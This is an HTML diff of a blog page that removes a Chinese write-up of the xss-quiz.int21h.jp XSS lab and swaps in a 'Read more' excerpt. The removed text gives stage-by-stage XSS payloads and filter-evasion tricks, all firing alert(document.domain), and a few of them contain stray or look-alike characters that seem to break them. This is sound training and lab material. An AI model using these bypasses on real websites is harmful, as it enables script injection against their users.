@@ -355,94 +355,16 @@
 
       
         
-          
-            <blockquote>
+          <blockquote>
 <h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>考试周摆烂，被复习压得身心俱疲，做会靶场透透气，巩固下xss。这个靶场的要求就是注入<code>alert(document.domain)</code>。</p>
 </blockquote>
-<h1 id="写在前面"><a href="#写在前面" class="headerlink" title="写在前面"></a>写在前面</h1><p>地址：<a target="_blank" rel="noopener" href="https://xss-quiz.int21h.jp/">xss challenge</a><br>如果遇到需要使用IE的情况但是又没有对应版本，可以在控制台中直接执行<code>alert(document.domain)</code>跳关。</p>
-<h1 id="stage-1"><a href="#stage-1" class="headerlink" title="stage 1"></a>stage 1</h1><p>Hint：very simple…</p>
-<p>确实简单，没有做任何过滤，直接写入就可以了：</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;alert(document.domain)&lt;/script&gt;</span><br></pre></td></tr></table></figure>
-
-<h1 id="stage-2"><a href="#stage-2" class="headerlink" title="stage 2"></a>stage 2</h1><p>Hint: close the current tag and add SCRIPT tag…</p>
-<p>如果不看提示的话去看源码也是可以发现注入时要记得闭合引号与标签：</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;input type=&quot;text&quot; name=&quot;p1&quot; size=&quot;50&quot; value=&quot;&quot;&gt;</span><br></pre></td></tr></table></figure>
-
-<p>因此构建payload时要顺便闭合tag：</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&quot;&gt;&lt;script&gt;alert(document.domain)&lt;/script&gt;</span><br></pre></td></tr></table></figure>
-
-<h1 id="stage-3"><a href="#stage-3" class="headerlink" title="stage 3"></a>stage 3</h1><p>Hint: The input in text box is properly escaped.</p>
-<p>文本框中的输入已经正确转义，这告诉我们别想从文本框中进行注入，但是我们发现后面又多了一个选择框，那么我们可以进行抓包将xss语句写入p2中：<br><img src="https://s2.loli.net/2021/12/30/Fc8pLm9znCqiRIW.png"></p>
-<h1 id="stage-4"><a href="#stage-4" class="headerlink" title="stage 4"></a>stage 4</h1><p>Hint: invisible input field</p>
-<p>隐藏的写入点，我们翻翻源码，发现居然藏了一个隐藏的p3注入点，或者直接抓包也可以看见这个注入点，直接在p3写入xss就行了。同样要注意闭合value，构建xss：<br><img src="https://s2.loli.net/2021/12/30/JWR4OzLNKUCtyPI.png"></p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">p1=1&amp;p2=Japan&amp;p3=&quot;&gt;&lt;script&gt;alert(document.domain)&lt;/script&gt;</span><br></pre></td></tr></table></figure>
-
-<h1 id="stage-5"><a href="#stage-5" class="headerlink" title="stage 5"></a>stage 5</h1><p>Hint: length limited text box</p>
-<p>限制了text的长度，这种题我们之前也有接触过。由于限制长度一般写在了前端，我们可以直接更改前端的JS绕过：</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;input type=&quot;text&quot; name=&quot;p1&quot; maxlength=&quot;100&quot; size=&quot;30&quot; value=&quot;&quot; &gt;</span><br></pre></td></tr></table></figure>
-
-<p>然后写入xss就行了：</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&quot;&gt;&lt;script&gt;alert(document.domain)&lt;/script&gt;</span><br></pre></td></tr></table></figure>
-
-<p>或者直接bp抓包提交也是可以的。</p>
-<h1 id="stage-6"><a href="#stage-6" class="headerlink" title="stage 6"></a>stage 6</h1><p>Hint: event handler attributes</p>
-<p>输入点仍是value，但是发现<code>&lt;&gt;</code>被html特殊字符替代，那么我们在这里考虑添加事件<code>onclick</code>，当按钮被点击时触发：</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&quot; onclick=&quot;alert(document.domain)&quot;</span><br></pre></td></tr></table></figure>
-
-<h1 id="stage-7"><a href="#stage-7" class="headerlink" title="stage 7"></a>stage 7</h1><p>Hint: nearly the same… but a bit more tricky.</p>
-<p>将第二关的payload写入发现整段payload都被包进了value当中，这是由于双引号被过滤了导致闭合不能成功。不过使用上一关的payload还是可行的:</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&quot; onclick=alert(document.domain)；</span><br></pre></td></tr></table></figure>
-<p>当然用其他事件标签也是可以的：</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&quot; onmouseover=alert(document.domain) //鼠标指针指向指定内容时执行事件</span><br></pre></td></tr></table></figure>
-
-
-<h1 id="stage-8"><a href="#stage-8" class="headerlink" title="stage 8"></a>stage 8</h1><p>Hint: the ‘javascript’ scheme.</p>
-<p>随便输入一个值，提交后查看源码：<br><img src="https://s2.loli.net/2021/12/30/JX9Fo5Lufzl2nhA.png"></p>
-<p>发现这个值被包裹在了<code>&lt;a&gt;</code>中，那么我们只需要在标签中添加一个JavaScript伪链接并点击即可：</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">javascript:alert(document.domain)</span><br></pre></td></tr></table></figure>
-
-<h1 id="stage-9"><a href="#stage-9" class="headerlink" title="stage 9"></a>stage 9</h1><p>Hint: UTF-7 XSS</p>
-<p>这关着实有点离谱，提示要我们将payload构造为utf-7编码同时过滤了<code>&lt;&gt;</code>，而这需要使用IE7浏览器，但是我没有，那就直接放个payload吧：</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">p1=1%2bACI- οnmοuseοver=%2bACI-alert(document.domain)%2bADsAIg- x=%2bACI-&amp;charset=UTF-7</span><br></pre></td></tr></table></figure>
-
-<h1 id="stage-10"><a href="#stage-10" class="headerlink" title="stage 10"></a>stage 10</h1><p>Hint: s/domain//g;</p>
-<p>同样先写入查看源码，发现domain被过滤了，直接双写绕过即可：</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&quot;&gt;&lt;script&gt;alert(document.dodomainmain)&lt;/script&gt;</span><br></pre></td></tr></table></figure>
-
-<h1 id="stage-11"><a href="#stage-11" class="headerlink" title="stage 11"></a>stage 11</h1><p>Hint: “s/script/xscript/ig;” and “s/on[a-z]+=/onxxx=/ig;” and “s/style=/stxxx=/ig;”　</p>
-<p>提示意味着script和onclick都被过滤了，这里我们用标签制作超链接，并且使用制表符（回车符、换行符等等不可见字符）来绕过正则匹配：</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&quot;&gt;&lt;a href=&quot;javascr&amp;#09;ipt:alert(document.domain);&quot;&gt;gonext&lt;/a&gt;</span><br></pre></td></tr></table></figure>
-
-<p>或者把s进行html实体化：</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&quot;&gt;&lt;a href=java&amp;#115;cript:alert(document.domain)&gt;gonext&lt;/a&gt;</span><br></pre></td></tr></table></figure>
-
-<h1 id="stage-12"><a href="#stage-12" class="headerlink" title="stage 12"></a>stage 12</h1><p>Hint: “s/[\x00-\x20&lt;&gt;&quot;&#39;]//g;”</p>
-<p><code>&lt;&gt;</code>、双引号、空格都被过滤了，这里要利用IE浏览器的一个特性，IE浏览器会将两个反引号识别为双引号，因此我们构建payload：<br><img src="https://s2.loli.net/2021/12/30/SjDb4W7NMq1mGEw.png"></p>
-<h1 id="stage-13"><a href="#stage-13" class="headerlink" title="stage 13"></a>stage 13</h1><p>Hint: style attribute</p>
-<p>这里要运用到css的知识以及IE8，因此没法直接演示，就大致讲下原理。由于在IE下能在CSS中运行JS代码，因此我们可以构建CSS代码并在其中写入js使IE执行xss。过滤了<code>&lt;&gt;</code>和<code>&quot;</code>，payload如下：</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">xss:expression(alert(document.domain));</span><br><span class="line">background:url(javascript:alert(&#x27;xss&#x27;));</span><br></pre></td></tr></table></figure>
-
-<h1 id="stage-14"><a href="#stage-14" class="headerlink" title="stage 14"></a>stage 14</h1><p>Hint: s/(url|script|eval|expression)/xxx/ig; </p>
-<p>同上一关，但是过滤了<code>url``script``eval``expression</code>四个关键字，这里直接使用注释符打断就可以了：</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">xss:expr\0ession(alert(document.domain));</span><br><span class="line">xss:expr/**/ession(alert(document.domain));</span><br></pre></td></tr></table></figure>
-
-<h1 id="stage-15"><a href="#stage-15" class="headerlink" title="stage 15"></a>stage 15</h1><p>Hint: document.write(); </p>
-<p>这关直接过滤了<code>document.write()</code>和<code>\</code>，转义了<code>&lt;&gt;</code>、<code>&quot;</code>、<code>&amp;</code>，双写反斜杠并且进行编码就可以绕过了,16进制、8进制、unicode编码等等都是可以的，构建payload：</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">十六进制： \\x3cscript\\x3ealert(document.domain);\\x3c/script\\x3e</span><br><span class="line">八进制： \\74cscript\\76ealert(document.domain);\\74/script\\76</span><br><span class="line">unicode： \\u003cscript\\u003ealert(document.domain);\\u003c/script\\u003e</span><br></pre></td></tr></table></figure>
-
-<h1 id="stage-16"><a href="#stage-16" class="headerlink" title="stage 16"></a>stage 16</h1><p>Hint: “document.write();” and “s/\x/\\x/ig;</p>
-<p>把<code>\\x</code>替换成了<code>\\\\x</code>，因此这里不能使用十六进制编码，因此使用上一关的八进制或者unicode编码都是可以的，这里换一种写法：</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Unicode: \\u003cscript\\u003ealert(document.domain);\\u003c/script\\u003e</span><br><span class="line">八进制: \\74img src=x οnerrοr=alert(document.domain)\\76</span><br></pre></td></tr></table></figure>
-
-<h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p>由于这个环境太古老了，因此有些只能在IE上跑，而且有些xss已经有点过时了，不过有些思路还是值得学习的，之后会做新的xss题目来继续巩固。</p>
-<p>先总结引号被过滤的几种情况：</p>
-<ol>
-<li>添加属性（onmouseover或onmouseout事件等以及expression）触发弹窗</li>
-<li><code>&quot;``&lt;&gt;</code>都被过滤时可以构造编码</li>
-<li>利用IE浏览器反引号翻译成双引号的特性</li>
-</ol>
-
-          
+          <!--noindex-->
+          <div class="post-button text-center">
+            <a class="btn" href="/2021/12/29/xss-challenges/#more" rel="contents">
+              Read more &raquo;
+            </a>
+          </div>
+          <!--/noindex-->
         
       
     </div>
